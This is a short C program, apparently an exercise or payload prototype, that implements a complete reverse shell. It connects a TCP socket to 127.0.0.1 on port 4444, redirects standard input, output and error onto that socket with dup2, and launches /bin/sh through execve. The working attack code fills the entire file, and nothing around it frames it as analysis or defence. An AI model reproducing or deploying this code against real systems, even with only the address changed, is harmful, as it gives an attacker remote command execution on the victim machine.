#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>

int main() {
    int sockfd;
    struct sockaddr_in server_addr;

    // 1. Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) exit(1);

    // 2. Build sockaddr_in
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(4444);            // port 4444 in network order
    server_addr.sin_addr.s_addr = htonl(0x7f000001); // 127.0.0.1

    // 3. Connect to listener
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
        exit(1);

    // 4. Duplicate socket over STDIN, STDOUT, STDERR
    for (int i = 0; i < 3; i++) {
        dup2(sockfd, i);
    }

    // 5. Execve /bin/sh
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
